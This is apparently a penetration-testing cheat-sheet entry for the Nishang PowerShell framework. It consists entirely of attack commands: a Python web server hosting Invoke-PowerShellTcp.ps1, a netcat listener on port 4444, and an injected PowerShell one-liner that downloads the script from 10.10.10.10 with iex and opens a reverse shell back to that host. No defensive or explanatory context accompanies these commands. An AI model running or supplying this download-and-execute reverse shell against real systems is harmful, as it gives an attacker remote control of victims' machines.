# Nishang

[Nishang](https://github.com/samratashok/nishang)

Open web server with Invoke-PowerShellTcp.ps1
```shell
python3 -m http.server 80
```

Open listener
```shell
nc -nlvp 4444
```

Code to inject
```shell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
```

